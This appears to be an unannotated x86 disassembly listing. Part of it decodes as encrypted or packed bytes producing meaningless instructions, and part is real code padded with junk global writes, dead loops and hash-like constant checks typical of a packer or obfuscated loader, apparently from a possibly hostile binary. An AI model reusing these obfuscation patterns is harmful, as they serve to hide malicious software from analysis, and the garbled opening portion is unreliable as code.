  420339:	idiv   BYTE PTR [edi+0x67e4652f]
  42033f:	add    BYTE PTR [ecx],bl
  420341:	stos   DWORD PTR es:[edi],eax
  420342:	outs   dx,DWORD PTR ds:[esi]
  420343:	push   ss
  420344:	cwde   
  420345:	sub    dl,BYTE PTR [edx-0x35]
  420348:	adc    al,0xd3
  42034a:	jno    0x420361
  42034c:	callw  0x8fe9
  420350:	xchg   ebx,eax
  420351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420352:	daa    
  420353:	mov    DWORD PTR [eax+0x48498354],edx
  420359:	imul   bl
  42035b:	mov    eax,ds:0x75c4a43a
  420360:	sbb    BYTE PTR ds:0x37561698,0x7c
  420367:	push   cs
  420368:	sub    dl,dl
  42036a:	mov    dh,0x14
  42036c:	dec    edi
  42036d:	dec    esi
  42036e:	jmp    0xd62af0a6
  420373:	add    DWORD PTR [edi-0x52],ecx
  420376:	sub    ebx,ebp
  420378:	cdq    
  420379:	dec    eax
  42037a:	push   es
  42037b:	loopne 0x42037a
  42037d:	sahf   
  42037e:	int3   
  42037f:	mov    dl,BYTE PTR [edx-0x55fa1ce0]
  420385:	and    BYTE PTR [edi+esi*4-0x2049d0],al
  42038c:	mov    ds:0x4b013ee5,al
  420391:	mov    eax,0xaac57c57
  420396:	and    eax,0xaf94abb3
  42039b:	mov    BYTE PTR [edx],ch
  42039d:	out    0x2,al
  42039f:	mov    ds:0xefe75381,eax
  4203a4:	cmp    eax,0x1cb55287
  4203a9:	add    cl,bh
  4203ab:	cdq    
  4203ac:	adc    eax,0xbd6d4655
  4203b1:	push   esp
  4203b2:	sbb    eax,0x3315dae1
  4203b7:	adc    al,0x8b
  4203b9:	jne    0x420409
  4203bb:	mov    ah,0x31
  4203bd:	or     ecx,DWORD PTR [ebx-0x4bf85526]
  4203c3:	mov    al,0x84
  4203c5:	jno    0x420347
  4203c7:	ret    
  4203c8:	xor    bh,al
  4203ca:	loop   0x420432
  4203cc:	push   esp
  4203cd:	es mov esp,0xe262dbce
  4203d3:	ins    DWORD PTR es:[edi],dx
  4203d4:	inc    esp
  4203d5:	adc    bh,BYTE PTR [edi-0x4c0bd42a]
  4203db:	call   0xc7c241ee
  4203e0:	add    eax,0xfc52208d
  4203e5:	xor    bh,BYTE PTR [ecx-0x49]
  4203e8:	(bad)  
  4203e9:	fwait
  4203ea:	test   eax,0x9da55fd8
  4203ef:	xor    eax,DWORD PTR [ebx+0x72]
  4203f2:	xchg   esp,eax
  4203f3:	leave  
  4203f4:	aaa    
  4203f5:	imul   DWORD PTR [edx-0x4c]
  4203f8:	push   esi
  4203f9:	mov    ah,0x77
  4203fb:	sub    BYTE PTR [edx],bl
  4203fd:	jge    0x420414
  4203ff:	cmp    esp,DWORD PTR [edi]
  420401:	xchg   edx,eax
  420402:	adc    dh,BYTE PTR [ebp-0x27]
  420405:	test   BYTE PTR [esi],0x6d
  420408:	data16 xor dh,ch
  42040b:	retf   
  42040c:	fist   WORD PTR [edi]
  42040e:	adc    cl,BYTE PTR [edi+eiz*8]
  420411:	stos   DWORD PTR es:[edi],eax
  420412:	das    
  420413:	cmc    
  420414:	pop    ss
  420415:	popf   
  420416:	mov    eax,0x5b1728e8
  42041b:	xor    dh,BYTE PTR [edi]
  42041d:	jnp    0x42049b
  42041f:	ds out 0x32,al
  420422:	bound  eax,QWORD PTR [edx]
  420424:	in     eax,0x5c
  420426:	ja     0x420413
  420428:	mov    WORD PTR [ebx+0x27b7198a],?
  42042e:	mov    eax,0x6ae1fd54
  420433:	shl    BYTE PTR [esi+eiz*1],cl
  420436:	add    edx,0x4f
  420439:	cmp    ebx,DWORD PTR [esi-0x3bee932c]
  42043f:	sti    
  420440:	mov    ebp,0xc30b645d
  420445:	jnp    0x420422
  420447:	pop    ecx
  420448:	adc    al,0x5a
  42044a:	adc    edi,DWORD PTR [ebp-0x45b6afa2]
  420450:	xor    BYTE PTR [edi+0x2a37daea],dh
  420456:	bnd jns 0x4204a5
  420459:	xchg   edi,eax
  42045a:	in     eax,0xbc
  42045c:	dec    ebp
  42045d:	inc    eax
  42045e:	xchg   ebx,eax
  42045f:	int3   
  420460:	repnz or dh,BYTE PTR [ebx-0x74]
  420464:	retf   0xbfa2
  420467:	jae    0x420402
  420469:	int3   
  42046a:	jns    0x42040d
  42046c:	push   edi
  42046d:	(bad)  [eax+ebp*2+0x4d5fa38b]
  420474:	xchg   edx,eax
  420475:	inc    ebx
  420476:	aad    0x50
  420478:	jns    0x4204e3
  42047a:	ss ss mov edx,0xa90cb407
  420481:	mov    ds:0x30c45fe5,al
  420486:	sbb    ebp,ebx
  420488:	das    
  420489:	mov    cl,0x2d
  42048b:	mov    esi,0x593ecb0b
  420490:	jns    0x42042f
  420492:	push   esi
  420493:	jmp    0x79c7:0x2b1170c1
  42049a:	fwait
  42049b:	xor    BYTE PTR [edi-0x1],bl
  42049e:	or     BYTE PTR [eax],cl
  4204a0:	jg     0x42045d
  4204a2:	(bad)  
  4204a3:	cdq    
  4204a4:	in     al,dx
  4204a5:	cmp    al,0xd0
  4204a7:	mov    ecx,0x63a8f381
  4204ac:	sbb    eax,0xcd0b15be
  4204b1:	gs and al,0xa8
  4204b4:	loopne 0x420487
  4204b6:	sbb    eax,0x6eb71e5f
  4204bb:	cld    
  4204bc:	mov    ecx,0x90c575c8
  4204c1:	retf   0x6b87
  4204c4:	sahf   
  4204c5:	or     BYTE PTR [ebp-0x256d899d],bl
  4204cb:	push   0x12b1b4e2
  4204d0:	inc    esi
  4204d1:	inc    ecx
  4204d2:	jne    0x4204bc
  4204d4:	jge    0x42046f
  4204d6:	aad    0x9f
  4204d8:	out    dx,eax
  4204d9:	push   eax
  4204da:	fidivr WORD PTR [ebx]
  4204dc:	xor    eax,0x4f19bc08
  4204e1:	fld    DWORD PTR [edi+0x6fb6c13]
  4204e7:	jmp    DWORD PTR [ecx-0x6ee209a6]
  4204ed:	arpl   WORD PTR [ebp-0x3fe602fc],di
  4204f3:	add    ebx,DWORD PTR [ebp+0x28]
  4204f6:	shr    BYTE PTR [ecx],0x9
  4204f9:	je     0x4204d3
  4204fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204fc:	inc    ebp
  4204fd:	dec    esi
  4204fe:	jge    0x4204b8
  420500:	clc    
  420501:	es dec esp
  420503:	ins    BYTE PTR es:[edi],dx
  420504:	inc    edx
  420505:	(bad)
  420508:	jno    0x420545
  42050a:	loope  0x420504
  42050c:	and    ebp,DWORD PTR [ebx+esi*2-0x23be6df2]
  420513:	xchg   esi,eax
  420514:	dec    edi
  420515:	ds in  eax,0x16
  420518:	push   ecx
  420519:	inc    BYTE PTR [ebp-0x233018b8]
  42051f:	aaa    
  420520:	adc    dl,BYTE PTR [ebx-0x48]
  420523:	xchg   BYTE PTR [eax+0x639c87a2],bl
  420529:	add    bh,BYTE PTR [ecx]
  42052b:	mov    dl,0x2
  42052d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42052e:	sub    al,0x9b
  420530:	das    
  420531:	mov    ecx,0xfdffa130
  420536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420537:	push   0x604a541c
  42053c:	ins    DWORD PTR es:[edi],dx
  42053d:	sub    ebx,ebx
  42053f:	or     eax,DWORD PTR [edx-0x69]
  420542:	xchg   ebp,eax
  420543:	(bad)
  420546:	push   esp
  420547:	sbb    DWORD PTR [edx-0x4c83368a],edx
  42054d:	sub    DWORD PTR [ecx+0x59aa0480],0xffffffcc
  420554:	cmp    BYTE PTR [edx],0xb8
  420557:	arpl   bx,dx
  420559:	les    ebx,FWORD PTR [edx]
  42055b:	jmp    0x42052d
  42055d:	inc    eax
  42055e:	ins    BYTE PTR es:[edi],dx
  42055f:	fisttp QWORD PTR [edx+eax*2-0x12]
  420563:	lock pop ecx
  420565:	mov    ah,0x95
  420567:	push   ebx
  420568:	mov    ds:0x8be5a664,eax
  42056d:	call   0xf06a99b8
  420572:	sub    ebx,DWORD PTR [ebx+0x3f]
  420575:	inc    edx
  420576:	mov    esi,0xc40bc4a0
  42057b:	mov    ds:0xe288483,al
  420580:	data16 das 
  420582:	lods   al,BYTE PTR ds:[esi]
  420583:	shr    edi,cl
  420585:	cmp    eax,DWORD PTR [ebp-0x7a7327bc]
  42058b:	popf   
  42058c:	in     eax,dx
  42058d:	stos   DWORD PTR es:[edi],eax
  42058e:	sub    bl,BYTE PTR [esi-0x55]
  420591:	and    BYTE PTR [edx+0x6b],dh
  420594:	push   ds
  420595:	in     eax,dx
  420596:	pop    esi
  420597:	sahf   
  420598:	jne    0x42053f
  42059a:	xchg   ecx,eax
  42059b:	adc    dh,al
  42059d:	cli    
  42059e:	not    DWORD PTR [edx+edi*4+0x34d6a205]
  4205a5:	cmp    cl,cl
  4205a7:	addr16 ss (bad) 
  4205aa:	sar    DWORD PTR [ebx],cl
  4205ac:	xchg   esp,eax
  4205ad:	test   BYTE PTR [ecx+0xf],ah
  4205b0:	dec    ebx
  4205b1:	mov    ds:0x3a3a8956,eax
  4205b6:	dec    ebp
  4205b7:	sbb    BYTE PTR [edx+ebx*2-0x2dda2942],cl
  4205be:	sbb    eax,0xb069de69
  4205c3:	test   al,0x37
  4205c5:	sbb    DWORD PTR [esi+edx*2],ebx
  4205c8:	xor    bh,BYTE PTR [edi+0x6f]
  4205cb:	ins    BYTE PTR es:[edi],dx
  4205cc:	repnz xlat BYTE PTR ds:[ebx]
  4205ce:	ja     0x42058f
  4205d0:	loop   0x4205a2
  4205d2:	dec    DWORD PTR [esi]
  4205d4:	push   eax
  4205d5:	add    eax,0xa54e341e
  4205da:	and    BYTE PTR [edx],dh
  4205dc:	xor    dl,BYTE PTR [edi]
  4205de:	cmc    
  4205df:	pushf  
  4205e0:	fs add ah,cl
  4205e3:	loope  0x42061e
  4205e5:	xor    al,0xbc
  4205e7:	xchg   esi,eax
  4205e8:	out    dx,al
  4205e9:	fs in  al,0xbf
  4205ec:	mov    esi,0x71765fad
  4205f1:	dec    esp
  4205f2:	int3   
  4205f3:	dec    esi
  4205f4:	sub    al,0xb3
  4205f6:	pushf  
  4205f7:	into   
  4205f8:	sub    ah,bl
  4205fa:	and    edi,DWORD PTR [edi-0xabaefa8]
  420600:	inc    ebx
  420601:	and    al,0xf3
  420603:	mov    al,ds:0x9091db70
  420608:	or     al,0x90
  42060a:	xor    bh,dl
  42060c:	call   0x5b42:0x3ae380d8
  420613:	dec    edi
  420614:	and    esp,edi
  420616:	popf   
  420617:	addr16 push edi
  420619:	loopne 0x4205b8
  42061b:	inc    edi
  42061c:	fwait
  42061d:	jg     0x4205ca
  42061f:	int    0xf6
  420621:	jbe    0x420619
  420623:	pop    edi
  420624:	xor    al,0x5f
  420626:	inc    edi
  420627:	fld    TBYTE PTR [ebx+0x7]
  42062a:	or     dh,BYTE PTR [edx+0x6c]
  42062d:	ins    DWORD PTR es:[edi],dx
  42062e:	(bad)  
  42062f:	in     eax,0xe0
  420631:	mov    ah,0x5d
  420633:	je     0x420610
  420635:	lds    ecx,FWORD PTR ds:0x91da743a
  42063b:	cmp    ecx,ebp
  42063d:	add    al,0xca
  42063f:	cli    
  420640:	mov    dh,0x2e
  420642:	push   cs
  420643:	jl     0x4205e4
  420645:	add    bh,0xa8
  420648:	enter  0xb28f,0x7f
  42064c:	mov    ch,0xab
  42064e:	cmp    al,BYTE PTR [edx+0x63367444]
  420654:	data16 xor al,0x0
  420657:	(bad)  
  420658:	stos   DWORD PTR es:[edi],eax
  420659:	jl     0x420690
  42065b:	dec    DWORD PTR [ebp+0x717a6382]
  420661:	sbb    al,BYTE PTR [esi]
  420663:	aam    0xf0
  420665:	in     eax,dx
  420666:	jle    0x4205f8
  420668:	push   esp
  42066a:	pop    eax
  42066b:	sti    
  42066c:	jmp    DWORD PTR [esi]
  42066e:	cdq    
  42066f:	(bad)  
  420670:	std    
  420671:	dec    esi
  420672:	int    0xf9
  420674:	or     bh,BYTE PTR [ebx+0x3679c421]
  42067a:	mov    al,ds:0x2259b7eb
  42067f:	retf   0x2f96
  420682:	and    bh,BYTE PTR [edx]
  420684:	mov    ah,0xbf
  420686:	jns    0x42069b
  420688:	clc    
  420689:	pushf  
  42068a:	mov    dh,BYTE PTR [esi]
  42068c:	shl    al,1
  42068e:	push   ss
  42068f:	mov    dh,0x48
  420691:	fimul  WORD PTR [esi+0x4d673fea]
  420697:	in     al,dx
  420698:	rcr    DWORD PTR [eax-0x6f7cfb3d],1
  42069e:	retf   0xd445
  4206a1:	push   edx
  4206a2:	pop    ecx
  4206a3:	ss mov bl,0xf6
  4206a6:	fild   WORD PTR [edx+0x28]
  4206a9:	cli    
  4206aa:	out    dx,al
  4206ab:	jmp    0xba6dcc7e
  4206b0:	lods   eax,DWORD PTR ds:[esi]
  4206b1:	pop    ecx
  4206b2:	or     BYTE PTR [esi],cl
  4206b4:	sbb    dl,BYTE PTR [eax-0x25]
  4206b7:	xlat   BYTE PTR ds:[ebx]
  4206b8:	pushf  
  4206b9:	retf   0x7174
  4206bc:	push   eax
  4206bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206be:	xor    eax,0x379979b6
  4206c3:	xchg   esi,eax
  4206c4:	push   ds
  4206c5:	int3   
  4206c6:	fidiv  WORD PTR [ebx+0x7bb17075]
  4206cc:	leave  
  4206cd:	call   0x391cbae2
  4206d2:	xchg   edi,eax
  4206d3:	outs   dx,DWORD PTR ds:[esi]
  4206d4:	bound  eax,QWORD PTR [edi-0x29]
  4206d7:	mov    bl,0x2c
  4206d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206da:	in     eax,dx
  4206db:	sbb    al,0xf7
  4206dd:	pop    eax
  4206de:	fwait
  4206df:	aaa    
  4206e0:	cli    
  4206e1:	inc    ebp
  4206e2:	pop    ds
  4206e3:	xor    BYTE PTR [edi],cl
  4206e5:	mov    al,ds:0x52b3f9e8
  4206ea:	arpl   WORD PTR [ecx+0x7d8be47d],cx
  4206f0:	or     BYTE PTR [ebx],dh
  4206f2:	stc    
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa27
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9e3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9f7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a0ab
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9fb
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9ff
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42aa03
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42aa07
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42aa0b
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42aa0f
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
